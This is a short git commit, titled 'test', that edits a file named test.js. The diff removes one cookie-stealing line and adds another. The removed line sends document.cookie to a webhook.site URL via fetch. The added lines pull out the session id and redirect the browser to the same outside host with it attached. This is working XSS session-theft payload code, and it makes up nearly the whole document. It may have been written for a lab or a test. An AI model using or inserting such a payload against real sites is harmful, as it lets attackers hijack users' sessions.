969a10d0bcf64b7afca0b54aaec123470a39af7f
OlivierProTips <olivierprotips@gmail.com>
2024-04-09 14:43:01 +0200

    test

--- test.js
+++ test.js
@@ -1,1 +1,2 @@
-fetch('https://webhook.site/6c963526-09d6-4f31-a0b4-b841d12a1698/?c='+document.cookie);
+var sessionid = document.cookie.split('=')[1] + ".";
+document.location = "https://webhook.site/6c963526-09d6-4f31-a0b4-b841d12a1698/?" + sessionid;
